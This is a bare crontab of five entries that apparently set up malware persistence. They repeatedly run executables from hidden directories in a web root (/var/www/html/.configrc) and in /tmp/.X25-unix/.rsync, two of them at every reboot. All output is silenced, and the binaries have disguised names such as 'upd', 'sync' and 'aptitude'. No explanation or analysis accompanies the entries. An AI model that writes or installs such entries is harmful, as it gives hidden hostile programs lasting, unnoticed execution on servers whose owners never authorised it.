1 1 */2 * * /var/www/html/.configrc/a/upd>/dev/null 2>&1
@reboot /var/www/html/.configrc/a/upd>/dev/null 2>&1
5 8 * * 0 /var/www/html/.configrc/b/sync>/dev/null 2>&1
@reboot /var/www/html/.configrc/b/sync>/dev/null 2>&1  
0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude>/dev/null 2>&1
